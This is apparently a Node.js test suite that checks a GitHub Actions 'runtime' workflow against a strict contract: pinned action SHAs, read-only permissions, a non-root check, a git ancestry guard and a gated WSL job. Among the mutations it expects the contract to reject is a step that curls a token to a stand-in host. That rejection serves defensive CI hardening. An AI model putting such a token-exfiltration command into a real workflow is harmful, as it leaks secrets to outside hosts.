import assert from 'node:assert/strict';
import { chmod, mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { createRequire } from 'node:module';
import { dirname, join } from 'node:path';
import { tmpdir } from 'node:os';
import { spawnSync } from 'node:child_process';
import test from 'node:test';
import { fileURLToPath, pathToFileURL } from 'node:url';

const repository = dirname(dirname(fileURLToPath(import.meta.url)));
const require = createRequire(join(repository, 'bot', 'package.json'));
const { parse } = require('yaml');
const workflow = join(repository, '.github', 'workflows', 'runtime.yml');
const CHECKOUT = 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1';
const SETUP_NODE = 'actions/setup-node@820762786026740c76f36085b0efc47a31fe5020';
const SETUP_WSL = 'Vampire/setup-wsl@d1da7f2c0322a5ee4f24975344f67fc0f5baf364';
const WSL_IF = "github.event_name == 'workflow_dispatch' || startsWith(github.ref, 'refs/tags/v')";
const WSL_CLONE = 'git init /home/builder/repo\ncd /home/builder/repo\ngit remote add origin "$SERVER/$REPOSITORY.git"\ngit fetch --depth 1 origin "$SHA"\ngit checkout FETCH_HEAD\n';
const WSL_NODE_INSTALL = 'cd /home/builder\ncurl -fsSLO https://nodejs.org/dist/v22.22.0/node-v22.22.0-linux-x64.tar.xz\necho "9aa8e9d2298ab68c600bd6fb86a6c13bce11a4eca1ba9b39d79fa021755d7c37  node-v22.22.0-linux-x64.tar.xz" | sha256sum -c -\nmkdir -p /home/builder/node\ntar -xJf node-v22.22.0-linux-x64.tar.xz -C /home/builder/node --strip-components=1\n';
const wslStep = (script) => `export PATH="/home/builder/node/bin:$PATH"\ncd /home/builder/repo\n${script}\n`;
const ANCESTRY_GUARD = "git cat-file -e 'HEAD^{commit}' || exit 1; commit=$(git cat-file commit HEAD) || exit 1; header=$(printf '%s\\n' \"$commit\" | sed -n '2p') || exit 1; case \"$header\" in parent\\ *) git rev-parse --verify HEAD^ >/dev/null 2>&1;; author\\ *) true;; *) exit 1;; esac";
const FETCH_REFS = "git fetch --force --tags origin '+refs/heads/*:refs/remotes/origin/*'";

function command(steps, run) {
	return steps.find((step) => step.run === run);
}

function action(steps, name) {
	return steps.find((step) => typeof step.uses === 'string' && step.uses.startsWith(`${name}@`));
}

function validate(document) {
	assert.deepEqual(Object.keys(document), ['name', 'on', 'permissions', 'jobs']);
	assert.equal(document.name, 'runtime');
	assert.deepEqual(document.on, {
		pull_request: null, push: { branches: ['main'], tags: ['v*'] }, workflow_call: null, workflow_dispatch: null,
	});
	assert.deepEqual(document.permissions, { contents: 'read' });
	assert.deepEqual(Object.keys(document.jobs ?? {}), ['check', 'platform', 'wsl']);
	const job = document.jobs.check;
	assert.deepEqual(Object.keys(job ?? {}).sort(), ['env', 'runs-on', 'steps']);
	assert.equal(job['runs-on'], 'ubuntu-latest');
	// Ticket 0287: bot/vitest.config.ts halves the cores by default; this
	// runner is not shared, so it stays uncapped.
	assert.deepEqual(job.env, { BOT_TEST_WORKERS: '4' });
	const steps = job.steps ?? [];
	const checkout = action(steps, 'actions/checkout');
	const setup = action(steps, 'actions/setup-node');
	assert.match(checkout?.uses ?? '', /^actions\/checkout@[0-9a-f]{40}$/);
	assert.match(setup?.uses ?? '', /^actions\/setup-node@[0-9a-f]{40}$/);
	assert.deepEqual(steps, [
		{ uses: CHECKOUT, with: { 'fetch-depth': 0, 'persist-credentials': false } },
		{ uses: SETUP_NODE, with: {
			'node-version': '22.22.0', cache: 'npm', 'cache-dependency-path': 'bot/npm-shrinkwrap.json',
		} },
		{ run: FETCH_REFS },
		{ run: 'sh sdlc/scripts/install' },
		{ run: 'test "$(id -u)" -ne 0' },
		{ run: ANCESTRY_GUARD },
		{ run: 'make check' },
		// Ticket 0287: the inventory proof left every local gate; the hosted
		// check job is now where it runs once per commit.
		{ run: 'make -C bot coverage' },
	]);
	const platform = document.jobs.platform;
	assert.deepEqual(Object.keys(platform ?? {}).sort(), ['runs-on', 'steps', 'strategy']);
	assert.deepEqual(platform.strategy, { 'fail-fast': false, matrix: { os: ['ubuntu-latest', 'macos-latest'] } });
	assert.equal(platform['runs-on'], '${{ matrix.os }}');
	assert.deepEqual(platform.steps, [
		{ uses: CHECKOUT, with: { 'persist-credentials': false } },
		{ uses: SETUP_NODE, with: { 'node-version': '22.22.0', cache: 'npm', 'cache-dependency-path': 'bot/npm-shrinkwrap.json' } },
		{ run: 'make -C bot install' },
		{ run: 'test "$(id -u)" -ne 0' },
		{ run: 'make platformcheck' },
	]);
	assert.equal(Object.hasOwn(platform, 'needs'), false);
	const wsl = document.jobs.wsl;
	assert.deepEqual(Object.keys(wsl ?? {}).sort(), ['defaults', 'if', 'runs-on', 'steps', 'timeout-minutes']);
	// The wsl job runs only on a manual dispatch or a v* tag push; an
	// ordinary pull_request or push to main must skip it and pay nothing.
	assert.equal(wsl.if, WSL_IF);
	assert.equal(wsl['runs-on'], 'windows-2025');
	assert.equal(wsl['timeout-minutes'], 90);
	assert.deepEqual(wsl.defaults, { run: { shell: 'wsl-bash {0}' } });
	assert.deepEqual(wsl.steps, [
		{ uses: SETUP_WSL, with: {
			distribution: 'Debian-13', 'wsl-version': 2,
			'additional-packages': 'git curl ca-certificates xz-utils make', 'wsl-shell-user': 'builder',
		} },
		{ env: {
			SERVER: '${{ github.server_url }}', REPOSITORY: '${{ github.repository }}', SHA: '${{ github.sha }}',
			// WSL interop only carries step env: values into the distribution
			// for names listed in WSLENV; without it $SERVER is unbound there.
			WSLENV: 'SERVER:REPOSITORY:SHA',
		}, run: WSL_CLONE },
		{ run: WSL_NODE_INSTALL },
		{ run: wslStep('test "$(id -u)" -ne 0') },
		{ run: wslStep('make -C bot install') },
		{ run: wslStep('make platformcheck') },
	]);
	const source = JSON.stringify(document).toLowerCase();
	for (const forbidden of ['make smoke', 'deploy-pages', 'upload-pages', 'npm publish', 'provider_api_key']) {
		assert.equal(source.includes(forbidden), false, `workflow contains forbidden ${forbidden}`);
	}
}

async function current() {
	return parse(await readFile(workflow, 'utf8'));
}

test('the runtime workflow runs the complete offline check from a clean non-root checkout', async () => {
	const source = await readFile(workflow, 'utf8');
	validate(parse(source));
	assert.ok(source.includes(`${CHECKOUT} # v7.0.1`));
	assert.ok(source.includes(`${SETUP_NODE} # v7.0.0`));
	assert.ok(source.includes(`${SETUP_WSL} # v7.0.0`));
});

test('the workflow contract rejects each weakened essential and prohibited work', async () => {
	const original = await current();
	const mutations = [
		(document) => { delete document.on.pull_request; },
		(document) => { delete document.on.workflow_call; },
		(document) => { document.defaults = { run: { shell: 'bash {0} || true' } }; },
		(document) => { document.on.pull_request = { paths: ['bot/**'] }; },
		(document) => { document.on.push.branches = ['develop']; },
		(document) => { document.on.push.paths = ['bot/**']; },
		(document) => { document.permissions.contents = 'write'; },
		(document) => { document.jobs.check['runs-on'] = 'macos-latest'; },
		(document) => { document.jobs.check.if = 'false'; },
		(document) => { action(document.jobs.check.steps, 'actions/checkout').uses = 'actions/checkout@v4'; },
		(document) => { action(document.jobs.check.steps, 'actions/checkout').uses = 'actions/checkout@11d5960a326750d5838078e36cf38b85af677262'; },
		(document) => { action(document.jobs.check.steps, 'actions/checkout').with['fetch-depth'] = 2; },
		(document) => { action(document.jobs.check.steps, 'actions/checkout').with['persist-credentials'] = true; },
		(document) => { action(document.jobs.check.steps, 'actions/setup-node').uses = 'actions/setup-node@v4'; },
		(document) => { action(document.jobs.check.steps, 'actions/setup-node').uses = 'actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020'; },
		(document) => { action(document.jobs.check.steps, 'actions/setup-node').with['node-version'] = '22.21.0'; },
		(document) => { command(document.jobs.check.steps, FETCH_REFS).run = 'git fetch --tags origin main'; },
		(document) => { command(document.jobs.check.steps, 'sh sdlc/scripts/install').run = 'npm ci'; },
		(document) => { command(document.jobs.check.steps, 'test "$(id -u)" -ne 0').run = 'true'; },
		(document) => { command(document.jobs.check.steps, ANCESTRY_GUARD).run = 'true'; },
		(document) => { command(document.jobs.check.steps, 'make check').run = 'make smoke'; },
		(document) => { command(document.jobs.check.steps, 'make check')['continue-on-error'] = true; },
		(document) => { command(document.jobs.check.steps, 'make check').if = 'always()'; },
		(document) => { document.jobs.check.steps.reverse(); },
		(document) => { document.jobs.check.steps.push(structuredClone(document.jobs.check.steps[0])); },
		(document) => { document.jobs.check.steps[6] = { run: 'curl https://example.test/?token=$TOKEN' }; },
		(document) => { document.jobs.check.steps.push({ uses: 'actions/upload-pages-artifact@v3' }); },
		(document) => { document.jobs.platform.strategy.matrix.os = ['ubuntu-latest']; },
		(document) => { document.jobs.platform.strategy.matrix.os.push('windows-latest'); },
		(document) => { document.jobs.platform.strategy['fail-fast'] = true; },
		(document) => { document.jobs.platform.needs = 'check'; },
		(document) => { action(document.jobs.platform.steps, 'actions/checkout').uses = 'actions/checkout@v4'; },
		(document) => { action(document.jobs.platform.steps, 'actions/checkout').with['persist-credentials'] = true; },
		(document) => { action(document.jobs.platform.steps, 'actions/setup-node').with['node-version'] = '22.21.0'; },
		(document) => { command(document.jobs.platform.steps, 'make -C bot install').run = 'npm install'; },
		(document) => { command(document.jobs.platform.steps, 'make platformcheck').run = 'make check'; },
		(document) => { command(document.jobs.platform.steps, 'make platformcheck')['continue-on-error'] = true; },
		(document) => { delete document.jobs.wsl.if; },
		(document) => { document.jobs.wsl.if = 'true'; },
		(document) => { document.jobs.wsl.if = "github.event_name == 'workflow_dispatch'"; },
		(document) => { document.jobs.wsl['runs-on'] = 'ubuntu-latest'; },
		(document) => { delete document.jobs.wsl['timeout-minutes']; },
		(document) => { document.jobs.wsl.defaults.run.shell = 'bash {0}'; },
		(document) => { action(document.jobs.wsl.steps, 'Vampire/setup-wsl').uses = 'Vampire/setup-wsl@v7'; },
		(document) => { action(document.jobs.wsl.steps, 'Vampire/setup-wsl').with['wsl-shell-user'] = 'root'; },
		(document) => { document.jobs.wsl.steps.push({ uses: 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1' }); },
		(document) => { document.jobs.wsl.steps[4].run = document.jobs.wsl.steps[4].run.replace('make -C bot install', 'npm install'); },
		(document) => { delete document.jobs.wsl.steps[1].env.WSLENV; },
		(document) => { document.jobs.wsl.steps[1].env.WSLENV = 'SERVER'; },
	];
	for (const mutate of mutations) {
		const changed = structuredClone(original);
		mutate(changed);
		assert.throws(() => validate(changed));
	}
});

function git(directory, ...args) {
	return spawnSync('git', args, { cwd: directory, encoding: 'utf8' });
}

function ancestryGuard(directory, env = process.env) {
	return spawnSync('sh', ['-c', ANCESTRY_GUARD], { cwd: directory, env, encoding: 'utf8' });
}

test('the ancestry guard accepts a root and exposed parent but rejects a hidden parent', async () => {
	const root = await mkdtemp(join(tmpdir(), 'bot-runtime-workflow-'));
	const source = join(root, 'source');
	try {
		await mkdir(source);
		assert.equal(git(source, 'init', '-q').status, 0);
		assert.equal(git(source, 'config', 'user.email', 'test@example.com').status, 0);
		assert.equal(git(source, 'config', 'user.name', 'Test').status, 0);
		await writeFile(join(source, 'fact'), 'one\n');
		assert.equal(git(source, 'add', 'fact').status, 0);
		assert.equal(git(source, 'commit', '-qm', 'one').status, 0);
		const rootClone = join(root, 'root');
		assert.equal(git(root, 'clone', '-q', '--depth', '2', pathToFileURL(source).href, rootClone).status, 0);
		assert.equal(ancestryGuard(rootClone).status, 0);
		await writeFile(join(source, 'fact'), 'two\n');
		assert.equal(git(source, 'commit', '-qam', 'two').status, 0);
		for (const [depth, parent] of [[1, false], [2, true]]) {
			const clone = join(root, `depth-${String(depth)}`);
			assert.equal(git(root, 'clone', '-q', '--depth', String(depth), pathToFileURL(source).href, clone).status, 0);
			assert.equal(ancestryGuard(clone).status === 0, parent);
		}
	} finally {
		await rm(root, { recursive: true, force: true });
	}
});

test('the ancestry guard fails closed when commit inspection fails', async () => {
	const root = await mkdtemp(join(tmpdir(), 'bot-runtime-workflow-'));
	const source = join(root, 'source');
	const fakeBin = join(root, 'fake-bin');
	try {
		await mkdir(source);
		assert.equal(git(source, 'init', '-q').status, 0);
		assert.equal(git(source, 'config', 'user.email', 'test@example.com').status, 0);
		assert.equal(git(source, 'config', 'user.name', 'Test').status, 0);
		await writeFile(join(source, 'fact'), 'one\\n');
		assert.equal(git(source, 'add', 'fact').status, 0);
		assert.equal(git(source, 'commit', '-qm', 'one').status, 0);
		await mkdir(fakeBin);
		const gitPath = spawnSync('sh', ['-c', 'command -v git'], { encoding: 'utf8' }).stdout.trim();
		assert.notEqual(gitPath, '');
		const escapedGitPath = gitPath.replaceAll("'", "'\\\\''");
		await writeFile(join(fakeBin, 'git'), `#!/bin/sh
if [ "$1" = cat-file ] && [ "$2" = commit ]; then exit 1; fi
exec '${escapedGitPath}' "$@"
`);
		await chmod(join(fakeBin, 'git'), 0o755);
		const env = { ...process.env, PATH: `${fakeBin}:${process.env.PATH ?? ''}` };
		assert.notEqual(ancestryGuard(source, env).status, 0);
	} finally {
		await rm(root, { recursive: true, force: true });
	}
});
